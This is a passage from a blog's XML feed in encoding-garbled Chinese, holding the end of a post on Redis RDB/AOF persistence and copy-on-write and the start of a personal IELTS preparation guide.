æˆé˜»å¡</li></ol><p><code>ä»€ä¹ˆä¼˜åŒ–ï¼Œè®©ä¸»è¿›ç¨‹é˜»å¡æ—¶é—´å°½é‡ç¼©å°ï¼Ÿ</code><br><strong>å†™æ—¶å¤åˆ¶</strong>ï¼Œåœ¨å‘ç”Ÿå†™æ“ä½œçš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿæ‰ä¼šå»å¤åˆ¶ç‰©ç†å†…å­˜ï¼Œè¿™æ ·æ˜¯ä¸ºäº†é˜²æ­¢ fork åˆ›å»ºå­è¿›ç¨‹æ—¶ï¼Œç”±äºç‰©ç†å†…å­˜æ•°æ®çš„å¤åˆ¶æ—¶é—´è¿‡é•¿è€Œå¯¼è‡´ä¸»è¿›ç¨‹é•¿æ—¶é—´é˜»å¡çš„é—®é¢˜ã€‚å½“å†²çªå‘ç”Ÿï¼Œå†è¿›è¡Œè§£å†³ï¼Œæ¥æé«˜æ•ˆç‡ã€‚ä¹Ÿå¯ä»¥å‡å°‘å†…å­˜åˆ†é…ã€‚</p><h3 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h3><h4 id="RDBå¿«ç…§æ˜¯ä»€ä¹ˆ-å¦‚ä½•ç”Ÿæˆ"><a href="#RDBå¿«ç…§æ˜¯ä»€ä¹ˆ-å¦‚ä½•ç”Ÿæˆ" class="headerlink" title="RDBå¿«ç…§æ˜¯ä»€ä¹ˆ?å¦‚ä½•ç”Ÿæˆ?"></a>RDBå¿«ç…§æ˜¯ä»€ä¹ˆ?å¦‚ä½•ç”Ÿæˆ?</h4><p>RDB å¿«ç…§è®°å½•çš„æ˜¯å†…å­˜ä¸­çš„å®é™…æ•°æ®ï¼ŒäºŒè¿›åˆ¶æ ¼å¼ï¼›æ‰€ä»¥åœ¨redisé‡å¯æ¢å¤æ•°æ®æ—¶ï¼Œåªéœ€è¦åŠ è½½rdbæ–‡ä»¶åˆ°å†…å­˜å³å¯ï¼Œé€Ÿåº¦è¾ƒå¿«</p><p>redisæä¾›äº†ä¸¤ä¸ªå‘½ä»¤æ¥ä¸»åŠ¨ç”Ÿæˆrdbæ–‡ä»¶<br>â—saveï¼šä¸»è¿›ç¨‹æ¥æ‰§è¡Œå…¨é‡å¿«ç…§æ“ä½œï¼Œè‹¥å†…å­˜æ•°æ®å¤ªå¤šï¼Œä¼šé˜»å¡ä¸»è¿›ç¨‹ï¼Œä¸æ¨è<br>â—bgsaveï¼šä¸»è¿›ç¨‹fork å­è¿›ç¨‹ï¼Œæ¥æ‰§è¡Œå…¨é‡å¿«ç…§æ“ä½œï¼Œè¿™ç§æ€æƒ³åœ¨AOFåå°é‡å†™æ—¥å¿—ä¹Ÿç”¨è¿‡ï¼Œé¿å…ä¸»çº¿ç¨‹çš„é˜»å¡</p><p>è¿˜å¯ä»¥é€šè¿‡é…ç½®å‚æ•°ï¼Œæ¥ç”Ÿæˆå¿«ç…§<br>é»˜è®¤é…ç½®ï¼šæ‰§è¡Œçš„æ˜¯ bgsave å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯ä¼šåˆ›å»ºå­è¿›ç¨‹æ¥ç”Ÿæˆ RDB å¿«ç…§æ–‡ä»¶ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br></pre></td></tr></table></figure><br>åªè¦æ»¡è¶³ä¸Šé¢æ¡ä»¶çš„ä»»æ„ä¸€ä¸ªï¼Œå°±ä¼šæ‰§è¡Œ bgsaveï¼Œå®ƒä»¬çš„æ„æ€åˆ†åˆ«æ˜¯ï¼š<br>900 ç§’ä¹‹å†…ï¼Œå¯¹æ•°æ®åº“è¿›è¡Œäº†è‡³å°‘ 1 æ¬¡ä¿®æ”¹ï¼›<br>300 ç§’ä¹‹å†…ï¼Œå¯¹æ•°æ®åº“è¿›è¡Œäº†è‡³å°‘ 10 æ¬¡ä¿®æ”¹ï¼›<br>60 ç§’ä¹‹å†…ï¼Œå¯¹æ•°æ®åº“è¿›è¡Œäº†è‡³å°‘ 10000 æ¬¡ä¿®æ”¹ã€‚</p><h4 id="æ‰§è¡ŒRDBå¿«ç…§è¿‡ç¨‹æ˜¯æ€æ ·çš„ï¼Ÿæ‰§è¡Œå¿«ç…§æ—¶ï¼Œæ•°æ®èƒ½è¢«ä¿®æ”¹å—ï¼Ÿ"><a href="#æ‰§è¡ŒRDBå¿«ç…§è¿‡ç¨‹æ˜¯æ€æ ·çš„ï¼Ÿæ‰§è¡Œå¿«ç…§æ—¶ï¼Œæ•°æ®èƒ½è¢«ä¿®æ”¹å—ï¼Ÿ" class="headerlink" title="æ‰§è¡ŒRDBå¿«ç…§è¿‡ç¨‹æ˜¯æ€æ ·çš„ï¼Ÿæ‰§è¡Œå¿«ç…§æ—¶ï¼Œæ•°æ®èƒ½è¢«ä¿®æ”¹å—ï¼Ÿ"></a>æ‰§è¡ŒRDBå¿«ç…§è¿‡ç¨‹æ˜¯æ€æ ·çš„ï¼Ÿæ‰§è¡Œå¿«ç…§æ—¶ï¼Œæ•°æ®èƒ½è¢«ä¿®æ”¹å—ï¼Ÿ</h4><p>Redis åŒæ ·é‡‡ç”¨<code>å†™æ—¶å¤åˆ¶</code>æŠ€æœ¯ï¼Œæ¥æ”¯æŒå¿«ç…§ï¼Œæ‰§è¡Œå¿«ç…§æ—¶æ•°æ®èƒ½è¢«ä¿®æ”¹ï¼Œå…·ä½“è¿‡ç¨‹ï¼š</p><p>ä¸»è¿›ç¨‹forkåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ¥æ‰§è¡Œbgsaveå‘½ä»¤,ä¸»è¿›ç¨‹ä¼šå°†è‡ªå·±çš„é¡µè¡¨å¤åˆ¶ä¸€ä»½ç»™å­è¿›ç¨‹ï¼Œè™šæ‹Ÿç©ºé—´æŒ‡å‘ç›¸åŒçš„ç‰©ç†ç©ºé—´ï¼Œæ¥è¾¾åˆ°ç©ºé—´å…±äº«.å­è¿›ç¨‹åœ¨è®°å½•å®é™…æ•°æ®åˆ°RDBæ–‡ä»¶è¿‡ç¨‹ä¸­ï¼Œè‹¥ä¸»è¿›ç¨‹æ²¡æœ‰æ‰§è¡Œå†™æ“ä½œå‘½ä»¤ï¼Œé‚£ä¹ˆå…±äº«ç©ºé—´å°±ä¸ä¼šå‘ç”Ÿå†²çªï¼Œä¹Ÿä¸ä¼šå‘ç”Ÿå†™æ—¶å¤åˆ¶ã€‚</p><p>è‹¥ä¸»è¿›ç¨‹éœ€è¦æ‰§è¡Œå†™æ“ä½œå‘½ä»¤ï¼Œå¦‚ä¸»çº¿ç¨‹ï¼ˆçˆ¶è¿›ç¨‹ï¼‰è¦ä¿®æ”¹å…±äº«æ•°æ®é‡Œçš„æŸä¸€å—æ•°æ®ï¼ˆæ¯”å¦‚é”®å€¼å¯¹ Aï¼‰æ—¶ï¼Œå°±ä¼šå‘ç”Ÿå†™æ—¶å¤åˆ¶ï¼Œè¿™å—æ•°æ®çš„ç‰©ç†å†…å­˜å°±ä¼šè¢«å¤åˆ¶ä¸€ä»½ï¼ˆé”®å€¼å¯¹ Aâ€™ï¼‰ï¼Œç„¶åä¸»çº¿ç¨‹åœ¨è¿™ä¸ªæ•°æ®å‰¯æœ¬ï¼ˆé”®å€¼å¯¹ Aâ€™ï¼‰è¿›è¡Œä¿®æ”¹æ“ä½œã€‚ä¸æ­¤åŒæ—¶ï¼Œbgsave å­è¿›ç¨‹å¯ä»¥ç»§ç»­æŠŠåŸæ¥çš„æ•°æ®ï¼ˆé”®å€¼å¯¹ Aï¼‰å†™å…¥åˆ° RDB æ–‡ä»¶ã€‚</p><p>bgsave å¿«ç…§è¿‡ç¨‹ä¸­ï¼Œ<strong>å¦‚æœä¸»çº¿ç¨‹ä¿®æ”¹äº†å…±äº«æ•°æ®ï¼Œå‘ç”Ÿäº†å†™æ—¶å¤åˆ¶åï¼Œæœ¬æ¬¡RDB å¿«ç…§ä¿å­˜çš„æ˜¯åŸæœ¬çš„å†…å­˜æ•°æ®ï¼Œè€Œä¸»çº¿ç¨‹åˆšä¿®æ”¹çš„æ•°æ®ï¼Œæ˜¯æ²¡åŠæ³•åœ¨è¿™ä¸€æ—¶é—´å†™å…¥ RDB æ–‡ä»¶çš„ï¼Œåªèƒ½äº¤ç”±ä¸‹ä¸€æ¬¡çš„ bgsave å¿«ç…§</strong></p><p><code>æ€ä¹ˆå°†RDBæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ï¼Ÿ</code></p><p>RDB æ–‡ä»¶çš„åŠ è½½å·¥ä½œæ˜¯åœ¨redisæœåŠ¡å™¨å¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡Œçš„ï¼ŒRedis å¹¶æ²¡æœ‰æä¾›ä¸“é—¨ç”¨äºåŠ è½½ RDB æ–‡ä»¶çš„å‘½ä»¤ã€‚</p><p><strong>RDB å¿«ç…§çš„ç¼ºç‚¹</strong><br>æ¯ä¸€æ¬¡æ‰§è¡ŒRDBå¿«ç…§ï¼Œè®°å½•çš„æ˜¯å†…å­˜ä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œç›¸å½“äºä¸€ä¸ªå…¨é‡å¿«ç…§ï¼Œå½“æ•°æ®è¾ƒå¤šæ—¶ï¼Œé¢‘ç¹è®°å½•å¿«ç…§ï¼Œè™½ç„¶å¯ä»¥é‡‡ç”¨å­è¿›ç¨‹æ¥æ‰§è¡Œï¼Œä½†è¿˜æ˜¯ä¼šå½±å“redisçš„æ€§èƒ½,å¦‚æœè®°å½•çš„å¤ªä¸é¢‘ç¹ï¼Œé‚£ä¹ˆå½“æœåŠ¡å™¨å®•æœºï¼Œä¸¢å¤±çš„æ•°æ®å°±éå¸¸å¤š</p><h4 id="å†™æ—¶å¤åˆ¶æœ‰ä»€ä¹ˆæç«¯åœºæ™¯ï¼Ÿ"><a href="#å†™æ—¶å¤åˆ¶æœ‰ä»€ä¹ˆæç«¯åœºæ™¯ï¼Ÿ" class="headerlink" title="å†™æ—¶å¤åˆ¶æœ‰ä»€ä¹ˆæç«¯åœºæ™¯ï¼Ÿ"></a>å†™æ—¶å¤åˆ¶æœ‰ä»€ä¹ˆæç«¯åœºæ™¯ï¼Ÿ</h4><p>åœ¨ Redis æ‰§è¡Œ RDB æŒä¹…åŒ–æœŸé—´ï¼Œåˆš fork æ—¶ï¼Œä¸»è¿›ç¨‹å’Œå­è¿›ç¨‹å…±äº«åŒä¸€ç‰©ç†å†…å­˜ï¼Œä½†æ˜¯é€”ä¸­ä¸»è¿›ç¨‹å¤„ç†äº†å†™æ“ä½œï¼Œä¿®æ”¹äº†å…±äº«å†…å­˜ï¼Œäºæ˜¯å½“å‰è¢«ä¿®æ”¹çš„æ•°æ®çš„ç‰©ç†å†…å­˜å°±ä¼šè¢«å¤åˆ¶ä¸€ä»½ã€‚é‚£ä¹ˆæç«¯æƒ…å†µä¸‹ï¼Œå¦‚æœæ‰€æœ‰çš„å…±äº«å†…å­˜éƒ½è¢«ä¿®æ”¹ï¼Œåˆ™æ­¤æ—¶çš„å†…å­˜å ç”¨æ˜¯åŸå…ˆçš„ 2 å€ã€‚æ‰€ä»¥ï¼Œé’ˆå¯¹å†™æ“ä½œå¤šçš„åœºæ™¯ï¼Œæˆ‘ä»¬è¦ç•™æ„ä¸‹å¿«ç…§è¿‡ç¨‹ä¸­å†…å­˜çš„å˜åŒ–ï¼Œé˜²æ­¢å†…å­˜è¢«å æ»¡äº†ã€‚</p><h4 id="AOFæ—¥å¿—-amp-RDBå¿«ç…§-åŒºåˆ«"><a href="#AOFæ—¥å¿—-amp-RDBå¿«ç…§-åŒºåˆ«" class="headerlink" title="AOFæ—¥å¿— &amp; RDBå¿«ç…§ åŒºåˆ«"></a>AOFæ—¥å¿— &amp; RDBå¿«ç…§ åŒºåˆ«</h4><p>å®ƒä»¬éƒ½æ˜¯redisæ•°æ®åº“å†…å­˜æŒä¹…åŒ–çš„æŠ€æœ¯</p><ol><li>è®°å½•çš„å†…å®¹ä¸åŒï¼šAOF æ–‡ä»¶çš„å†…å®¹æ˜¯æ“ä½œå‘½ä»¤ï¼›RDB æ–‡ä»¶çš„å†…å®¹æ˜¯äºŒè¿›åˆ¶æ•°æ®ã€‚</li><li>æ¢å¤æ•°æ®æ—¶ï¼Œè€—è´¹çš„æ—¶é—´ä¸åŒï¼šRDB æ¢å¤æ•°æ®çš„æ•ˆç‡ä¼šæ¯” AOF é«˜äº›ï¼Œå› ä¸ºç›´æ¥å°† RDB æ–‡ä»¶è¯»å…¥å†…å­˜å°±å¯ä»¥ï¼ŒAOF éœ€è¦é¢å¤–æ‰§è¡Œæ“ä½œå‘½ä»¤çš„æ­¥éª¤æ‰èƒ½æ¢å¤æ•°æ®ï¼Œé€Ÿåº¦æ…¢</li><li>åœ¨æœåŠ¡å™¨å‘ç”Ÿæ•…éšœæ—¶ï¼Œä¸¢å¤±æ•°æ®å¤šå°‘æ–¹é¢ï¼šRDBæ˜¯ä¸€ä¸ªå…¨é‡å¿«ç…§ï¼Œä¸èƒ½é¢‘ç¹æ‰§è¡Œï¼Œå¦åˆ™ä¼šå½±å“æ€§èƒ½,æ‰€ä»¥ä¸¢å¤±æ•°æ®ç›¸å¯¹æ¥è¯´è¾ƒå¤š.AOFæ”¯æŒç§’çº§è®°å½•å‘½ä»¤åˆ°AOFæ–‡ä»¶ä¸­,æ‰€ä»¥ä¸¢å¤±çš„æ•°æ®ç›¸å¯¹æ¥è¯´è¾ƒå°‘</li></ol><h3 id="AOF-RDBæ··åˆæŒä¹…åŒ–"><a href="#AOF-RDBæ··åˆæŒä¹…åŒ–" class="headerlink" title="AOF|RDBæ··åˆæŒä¹…åŒ–"></a>AOF|RDBæ··åˆæŒä¹…åŒ–</h3><h4 id="AOF-RDBè¿›è¡Œæ··åˆæŒä¹…åŒ–æœ‰ä»€ä¹ˆä¼˜ç‚¹ï¼Ÿ"><a href="#AOF-RDBè¿›è¡Œæ··åˆæŒä¹…åŒ–æœ‰ä»€ä¹ˆä¼˜ç‚¹ï¼Ÿ" class="headerlink" title="AOF|RDBè¿›è¡Œæ··åˆæŒä¹…åŒ–æœ‰ä»€ä¹ˆä¼˜ç‚¹ï¼Ÿ"></a>AOF|RDBè¿›è¡Œæ··åˆæŒä¹…åŒ–æœ‰ä»€ä¹ˆä¼˜ç‚¹ï¼Ÿ</h4><p><code>æ··åˆæŒä¹…åŒ–å¯ä»¥åˆ©ç”¨è¿™ä¸¤ç§æ—¥å¿—çš„ä¼˜ç‚¹ï¼š</code>AOFå¯ä»¥æ”¯æŒç§’çº§è®°å½•æ—¥å¿—ï¼Œä½¿å¾—æ•°æ®æ›´å°‘çš„ä¸¢å¤±,RDBåœ¨æ•°æ®æ¢å¤æ—¶éå¸¸å¿«ï¼Œä¸éœ€è¦é‡æ–°æ‰§è¡Œå‘½ä»¤</p><p><code>æ··åˆæŒä¹…åŒ–çš„è¿‡ç¨‹åªå‘ç”Ÿåœ¨AOFæ—¥å¿—é‡å†™çš„è¿‡ç¨‹</code>ï¼Œå¦‚ä¸‹ï¼š</p><ol><li>å½“AOFæ—¥å¿—è¾¾åˆ°é˜ˆå€¼æ—¶ï¼Œè§¦å‘åå°é‡å†™æœºåˆ¶,ä¸»è¿›ç¨‹forkåˆ›å»ºå­è¿›ç¨‹ï¼Œå¹¶ä¸”å°†ä¸»è¿›ç¨‹çš„é¡µè¡¨å¤åˆ¶ä¸€ä»½ç»™å­è¿›ç¨‹</li><li>å­è¿›ç¨‹ä¸ä¸»è¿›ç¨‹å…±äº«ç©ºé—´ï¼Œå¯¹å½“å‰å†…å­˜æ•°æ®æ‰§è¡ŒRDBå¿«ç…§ï¼Œå°†RDBæ ¼å¼çš„æ—¥å¿—è®°å½•åˆ°æ–°çš„AOFæ–‡ä»¶ä¸­</li><li>å¹¶ä¸”åœ¨é‡å†™è¿‡ç¨‹ï¼Œä¸»çº¿ç¨‹å¤„ç†çš„å†™æ“ä½œå‘½ä»¤ä¼šè¢«è®°å½•åœ¨AOFé‡å†™ç¼“å†²åŒºé‡Œï¼Œå½“RDBå¿«ç…§è®°å½•å®Œæ¯•ï¼ŒAOFé‡å†™ç¼“å†²åŒºé‡Œçš„å¢é‡å‘½ä»¤ä¼šä»¥ AOF æ–¹å¼å†™å…¥åˆ° AOF æ–‡ä»¶</li><li>å†™å…¥å®Œæˆåé€šçŸ¥ä¸»è¿›ç¨‹,å°†æ–°çš„å«æœ‰ RDB æ ¼å¼å’Œ AOF æ ¼å¼çš„ AOF æ–‡ä»¶æ›¿æ¢æ—§çš„çš„ AOF æ–‡ä»¶ã€‚</li></ol><p>ä½¿ç”¨äº†æ··åˆæŒä¹…åŒ–ï¼ŒAOF æ–‡ä»¶çš„å‰åŠéƒ¨åˆ†æ˜¯ RDB æ ¼å¼çš„å…¨é‡æ•°æ®ï¼ŒååŠéƒ¨åˆ†æ˜¯ AOF æ ¼å¼çš„å¢é‡æ•°æ®ã€‚</p><p><strong>å¥½å¤„</strong>ï¼š<br>é‡å¯RedisåŠ è½½æ•°æ®çš„æ—¶å€™ï¼Œç”±äºå‰åŠéƒ¨åˆ†æ˜¯RDBå†…å®¹ï¼Œè¿™æ ·åŠ è½½çš„æ—¶å€™é€Ÿåº¦ä¼šå¾ˆå¿«ã€‚åŠ è½½å®Œ RDB çš„å†…å®¹åï¼Œæ‰ä¼šåŠ è½½ååŠéƒ¨åˆ†çš„ AOF å†…å®¹ï¼Œè¿™é‡Œçš„å†…å®¹æ˜¯ Redis åå°å­è¿›ç¨‹é‡å†™ AOF æœŸé—´ï¼Œä¸»çº¿ç¨‹å¤„ç†çš„æ“ä½œå‘½ä»¤ï¼Œå¯ä»¥ä½¿å¾—æ•°æ®æ›´å°‘çš„ä¸¢å¤±ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IELTSå¤‡è€ƒç»éªŒ(ä¸ªäººå‘)</title>
      <link href="/2024/04/10/2024-04-10/"/>
      <url>/2024/04/10/2024-04-10/</url>
      
        <content type="html"><![CDATA[<h3 id="IELTSå¤‡è€ƒç»éªŒ-ä¸ªäººå‘"><a href="#IELTSå¤‡è€ƒç»éªŒ-ä¸ªäººå‘" class="headerlink" title="IELTSå¤‡è€ƒç»éªŒ(ä¸ªäººå‘)"></a>IELTSå¤‡è€ƒç»éªŒ(ä¸ªäººå‘)</h3><p>é¦–è€ƒ6.5(6), è™½ç„¶æ²¡è€ƒåˆ°å°åˆ†6.5, æˆ‘ä¹Ÿæ¥å—äº†, è¿‡æ®µæ—¶é—´å†è€ƒå§.</p><h4 id="æœºè€ƒorçº¸ç¬”"><a href="#æœºè€ƒorçº¸ç¬”" class="headerlink" title="æœºè€ƒorçº¸ç¬”"></a>æœºè€ƒorçº¸ç¬”</h4><p>é›…æ€æœ‰æœºè€ƒä¹Ÿæœ‰ä¼ ç»Ÿçš„çº¸ç¬”è€ƒè¯•å½¢å¼, ä¸ªäººæ›´æ¨èæœºè€ƒ, åŸå› å¦‚ä¸‹:</p><ol><li>æœºè€ƒå£è¯­å’Œç¬”è¯•ä¸€èˆ¬éƒ½åœ¨åŒä¸€å¤©, è€Œçº¸ç¬”çš„å£è¯­å’Œç¬”è¯•ä¸€èˆ¬ä¸åœ¨åŒä¸€å¤©, æœ‰æ—¶å€™å¯èƒ½ä¼šå·®ä¸€ä¸ªæ˜ŸæœŸ, å¦‚æœè€ƒç‚¹ç¦»ä½ ä½çš„åœ°æ–¹æ¯”è¾ƒè¿œçš„è¯, éå¸¸ä¸æ–¹ä¾¿, åƒæˆ‘è¿™ç§å­¦æ ¡åœ¨éƒŠåŒºçš„, æœæ–­é€‰æ‹©æœºè€ƒ</li><li>æœºè€ƒçš„è€ƒä½å¤š, è€ƒè¯•æ—¶é—´çµæ´», çº¸ç¬”ä¸€èˆ¬ä¸€ä¸ªæ˜ŸæœŸåªæœ‰ä¸¤åœº, è€Œæœºè€ƒå‡ ä¹æ¯å¤©éƒ½æœ‰ä¸¤åœº</li><li>æœºè€ƒå¯¹äºé‚£äº›å†™å­—ä¸å¥½çœ‹çš„äººæ¥è¯´å¾ˆå‹å¥½, è€Œä¸”æ‰“å­—æ¯”è¾ƒå¿«, è¿˜æœ‰æ—¶é—´å»æ£€æŸ¥å’Œè°ƒæ•´</li><li>æœºè€ƒå¯¹äºé˜…è¯»ä¹Ÿæ¯”è¾ƒå‹å¥½, ä¸ç”¨ç¿»æ¥ç¿»å»çš„</li></ol><p>å½“ç„¶æœºè€ƒä¹Ÿæœ‰ä¸€äº›<strong>ç¼ºç‚¹</strong>: å¬åŠ›æ—¶é—´ä¼šæ›´çŸ­, å¯¹äºæˆ‘æ¥è¯´å°±æ˜¯è¯»é¢˜æ—¶é—´ä¼šå‡å°‘, è€Œä¸”æˆ‘è€ƒçš„é‚£åœºæ„Ÿè§‰è€³æœºå¾ˆçƒ‚, æ¼éŸ³æ¯”è¾ƒä¸¥é‡, å¦‚æœæ˜¯æ¯”è¾ƒå®¹æ˜“å—ç¯å¢ƒå½±å“çš„åŒå­¦, å¯èƒ½ä¼šæ¯”è¾ƒåƒäº, æˆ‘è€ƒå‡ºæ¥å°±æ¯”å¹³æ—¶è‡ªå·±é™æ—¶ç»ƒä½äº†0.5åˆ†</p><p>æ€»çš„æ¥è¯´, å¯¹äºæ—¶é—´æ¯”è¾ƒå……è£•, å†™å­—æ¯”è¾ƒå¥½çœ‹çš„åŒå­¦(æˆ–è€…æ‰“å­—ç‰¹åˆ«æ…¢), æˆ‘è¿˜æ˜¯æŒºå»ºè®®çº¸ç¬”çš„, å…¶ä»–åŒå­¦æˆ‘éƒ½å»ºè®®å»è€ƒæœºè€ƒ</p><h4 id="å…³äºéš¾åº¦"><a href="#å…³äºéš¾åº¦" class="headerlink" title="å…³äºéš¾åº¦"></a>å…³äºéš¾åº¦</h4><p>å¯ä»¥çœ‹åˆ°, ç½‘ä¸Šæœ‰å¾ˆå¤šäººåœ¨æ•£æ’­ç„¦è™‘, è¯´ä»€ä¹ˆæ­£å¼è€ƒè¯•æ¯”å‰‘æ¡¥é›…æ€éš¾å¤šäº†, å…¶å®ä¸ªäººä½“æ„Ÿä¸‹æ¥æ˜¯å·®ä¸å¤šçš„, å› ä¸ºå¹³æ—¶å‰‘é›…ä¹Ÿæœ‰éš¾åº¦æ³¢åŠ¨, ä¸èƒ½æ‹¿æ­£å¼è€ƒè¯•å’Œå¹³æ—¶æœ€ç®€å•çš„å·å­è¿›è¡Œæ¯”è¾ƒ. å½“ç„¶, æœºè€ƒçš„æŠ½é¢˜æ¯”è¾ƒéšæœº, æ‰€ä»¥éš¾åº¦æ³¢åŠ¨ä¼šæ›´å¤§, ä¸è¿‡æ€»ä½“æ¥è¯´, æœºè€ƒçš„éš¾åº¦å’Œå‰‘é›…æ˜¯å·®ä¸å¤šçš„.</p><h4 id="å¹³æ—¶ç»ƒä¹ "><a href="#å¹³æ—¶ç»ƒä¹ " class="headerlink" title="å¹³æ—¶ç»ƒä¹ "></a>å¹³æ—¶ç»ƒä¹ </h4><p>æˆ‘åœ¨åŒæ¡Œè‹±è¯­è¿™ä¸ªå¹³å°è¿›è¡Œç»ƒä¹ , å‡ ä¹å’ŒçœŸå®æœºè€ƒæ˜¯æ²¡å¤ªå¤§åŒºåˆ«çš„(90+%çš„ç›¸ä¼¼åº¦å§), è¦äº†è§£è‡ªå·±çš„è€ƒåœºæ˜¯å¦é‡‡ç”¨æ–°æœºè€ƒ, åˆ‡æ¢åˆ°å¯¹åº”çš„æ¨¡å¼, ç°åœ¨åº”è¯¥æ˜¯å…¨å›½çš„è€ƒåœºéƒ½æ¢æ–°æœºè€ƒç³»ç»Ÿäº†</p><h4 id="å¬åŠ›"><a href="#å¬åŠ›" class="headerlink" title="å¬åŠ›"></a>å¬åŠ›</h4><p>å¬åŠ›æ„Ÿè§‰æˆ‘æ²¡ä»€ä¹ˆå¯åˆ†äº«çš„ç»éªŒ, å°±æ˜¯å…ˆç†Ÿæ‚‰é¢˜å‹, ç†Ÿæ‚‰å®Œé¢˜å‹åå†åšé¢˜å‡ ä¹å°±æ˜¯èƒ½è¯„ä¼°å‡ºè‡ªå·±çš„çœŸå®æ°´å¹³äº†, æ ¹æ®è‡ªå·±è–„å¼±çš„é¢˜å‹å†å»åˆ»æ„åœ°åˆ·, åƒæˆ‘çš„åŒ¹é…å’Œå¤šé€‰é¢˜å°±æ¯”è¾ƒçƒ‚, æˆ‘å°±ä¼šå¤šåˆ·ä¸€äº›, ä¸ªäººè§‰å¾—å¹³æ—¶ç»ƒä¹ æ¯”è‡ªå·±ç›®æ ‡åˆ†é«˜0.5å°±åŸºæœ¬ç¨³äº†</p><h4 id="é˜…è¯»"><a href="#é˜…è¯»" class="headerlink" title="é˜…è¯»"></a>é˜…è¯»</h4><p>é˜…è¯»çš„è¯æˆ‘å…¶å®æ²¡æ€ä¹ˆåˆ·, åšäº†å‡ å¥—åŸºæœ¬ç¨³7.5ä¹‹åæˆ‘å°±ä¸åˆ·äº†, ä¹Ÿæ²¡ä»€ä¹ˆæŠ€å·§, å…ˆçœ‹é¢˜ç›®, å†çœ‹æ–‡ç« , è¦å°†æ–‡ç« çš„å¤§æ„å’Œç»“æ„ææ˜ç™½å°±å¯ä»¥, ç„¶åå»å®šä½, ç‰¹åˆ«æ˜¯ç¬¬ä¸€ç¯‡, å¤ªç®€å•äº†, åƒä¸‡ä¸è¦ç²¾è¯», 10-15åˆ†é’Ÿè§£å†³, ç¬¬äºŒç¯‡15-20åˆ†é’Ÿè§£å†³, ç•™ä¸‹å……è¶³æ—¶é—´ç»™æœ€åä¸€ç¯‡, ä¸ªäººè§‰å¾—æœ€å¥½ç•™å¤Ÿ30åˆ†é’Ÿ, ä¸ç„¶çœŸæœ‰å¯èƒ½æ¥ä¸åŠ</p><h4 id="ä½œæ–‡"><a href="#ä½œæ–‡" class="headerlink" title="ä½œæ–‡"></a>ä½œæ–‡</h4><p>å°ä½œæ–‡çš„è¯æˆ‘çœ‹äº†(ç²—è¯»)simonçš„<code>è·Ÿé›…æ€è€ƒå®˜simonå­¦å†™ä½œ</code>, å€¼å¾—çœ‹çš„å°±æ˜¯æ¯ç§é¢˜å‹çš„æè¿°é‡ç‚¹, æ–‡ç« ç»“æ„å°±æ˜¯å››æ®µä½“, ç¬¬ä¸€æ®µæ”¹å†™é¢˜ç›®, ç¬¬äºŒæ®µå†™æ€»ä½“, ç¬¬ä¸‰å››æ®µå°†å›¾è¡¨åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†åˆ†æ, å¯ä»¥æ˜¯æŒ‰æ—¶é—´, è¶‹åŠ¿, å“ç±»ç­‰åˆ†. æˆ‘è¿˜çœ‹äº†bç«™ä¸Šä¸¸å­tinaçš„ä¸¤ä¸ªå°ä½œæ–‡çš„è§†é¢‘, æˆ‘è§‰å¾—å†™å¾—è¿˜æ˜¯å¾ˆå¥½çš„, å‰©ä¸‹çš„å°±æ˜¯è‡ªå·±æ€»ç»“ä¸€ä¸‹è‡ªå·±å–œæ¬¢çš„æè¿°è¯­å¥.</p><p>å¤§ä½œæ–‡çš„è¯,å…ˆè¦æŠŠå¤§ä½œæ–‡çš„ç»“æ„ææ¸…æ¥š, æˆ‘ç”¨çš„æ˜¯bç«™ä¸Švincceçš„äº”æ®µç»“æ„, ç¬¬ä¸€æ®µæ ¹æ®é¢˜ç›®å¼•å‡ºè®®é¢˜å¹¶é˜æ˜è§‚ç‚¹, ç¬¬äºŒä¸‰æ®µæ¯æ®µä¸€ä¸ªè®ºç‚¹,ç„¶åè§£é‡Š,æœ€åè®ºè¯,å¤šç”¨ä¸¾ä¾‹å’Œæ¡ä»¶è¯­å¥,è¿æ¥è¯è¦ä¸°å¯Œ. ç¬¬å››æ®µéƒ¨åˆ†è‚¯å®šå¯¹ç«‹è§‚ç‚¹,ç„¶åè®ºè¯è‚¯å®šè‡ªå·±çš„è§‚ç‚¹. ç¬¬äº”æ®µå°±æ˜¯å¸¸è§„æ€»ç»“. ç„¶åå¤šçœ‹æ–‡ç« , ç§¯ç´¯ä¸€äº›ç´ æ, ä¹Ÿå¯ä»¥å¶å°”è®­ç»ƒä¸€ä¸¤ç¯‡.</p><p>å¯ä»¥å»çœ‹vinceä»–ä»¬çš„å…¬ä¼—å·,é‡Œé¢æ–‡ç« çš„ç´ æè¿˜æ˜¯å¾ˆä¸é”™çš„, å¦å¤–æ¨èä¸€ä¸ªç½‘ç«™ <a href="https://www.ieltsessaybank.com/" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">ieltsessaybank</a>,è¿™æ˜¯æ²¹ç®¡ä¸Šä¸€ä¸ªåšä¸»çš„ç½‘ç«™, è™½ç„¶æ„Ÿè§‰éƒ¨åˆ†è§‚ç‚¹çš„è®ºè¯å’Œä¸­å›½äººæœ‰å¾ˆå¤§åŒºåˆ«, ä½†æ˜¯ç´ æè¿˜æ˜¯ä¸é”™çš„, æ¯”è¾ƒç¬¦åˆè¥¿æ–¹æ€ç»´. </p><h4 id="å£è¯­"><a href="#å£è¯­" class="headerlink" title="å£è¯­"></a>å£è¯­</h4><p>ä¸ªäººçš„å£è¯­è™½ç„¶å‡†å¤‡äº†,ä½†è¿˜æ˜¯å‡†å¤‡çš„ä¸å¤ªå……åˆ†,è€ƒåœºä¸Šçš„çŠ¶æ€å‡ ä¹å°±æ˜¯è£¸è€ƒ, 